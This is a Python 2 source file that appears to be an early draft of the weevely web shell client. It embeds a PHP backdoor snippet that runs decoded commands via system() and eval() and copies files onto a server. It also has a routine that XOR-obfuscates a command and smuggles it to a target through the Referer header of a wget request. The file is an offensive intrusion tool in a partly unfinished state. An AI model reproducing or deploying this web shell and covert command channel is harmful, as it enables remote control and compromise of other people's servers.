# -*- coding: utf-8 -*-

from numpy import frombuffer, bitwise_xor, byte
import getopt, sys, base64, os


back="""
$ref[1] = base64_decode($ref[1]);
switch($ref[2]){
	case 0:
		system($ref[1]." 2>&1");
		break;
	case 1:
		$cmd = explode(' ', $ref[1]);
		echo file_put_contents($cmd[1], file_get_contents($cmd[0]))."\n";
		break;
	case 2:
		@eval($ref[1]);
		break;
}
"""


class weevely:
  
  def main(self):
    #self.generate()
    try:
	opts, args = getopt.getopt(sys.argv[1:], 'g:', ['generate'])
    except getopt.error, msg:
	print "Error:", msg
	exit(2)

    print args
    ## process options
    for o, a in opts:
	if o in ("g", "generate"):
	    print "AAMKJHLHJAHNO"
	else:
	 print ""
	    
	    
  def crypt(self, text, key):
    #return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
    text = frombuffer( text, dtype=byte )
    firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
    strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
    strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
    
    toret = base64.b64encode(( (text ^ firstpad) & strrepeat ) | ( text & strrepeat2 ))
    return toret 

  def generate(self):
    cmdstr=self.crypt("http://www.google.it a/culo.html","c4m4ll0")
    wgetstr='wget --referer "http://www.google.com/asdsds?dsa=c4m4ll0&asd=' + cmdstr + '&asdsad=1" http://192.168.1.102/ -O - -q'
    os.system(wgetstr)
    



if __name__ == "__main__":
    
    app=weevely()
    app.main()
    
    
    
